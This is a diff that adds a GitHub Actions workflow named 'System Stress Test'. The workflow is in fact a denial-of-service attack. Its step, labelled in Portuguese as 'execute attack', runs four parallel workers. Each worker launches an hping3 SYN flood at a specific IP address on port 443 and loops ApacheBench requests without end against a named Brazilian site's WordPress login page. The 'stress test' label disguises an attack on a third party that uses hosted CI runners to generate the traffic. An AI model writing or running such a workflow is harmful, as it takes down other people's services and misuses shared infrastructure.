@@ -1,0 +1,20 @@
+name: System Stress Test
+on:
+  workflow_dispatch:
+
+jobs:
+  exaustao:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker: [1, 2, 3, 4]
+    steps:
+      - name: Instalar ferramentas
+        run: sudo apt-get update && sudo apt-get install -y hping3 apache2-utils
+      - name: Executar ataque
+        run: |
+          sudo hping3 -S --flood -V -p 443 186.193.226.138 &
+          while true; do
+            ab -n 1000000 -c 500 -k https://polistampo.com.br/wp-login.php || true
+            sleep 1
+          done
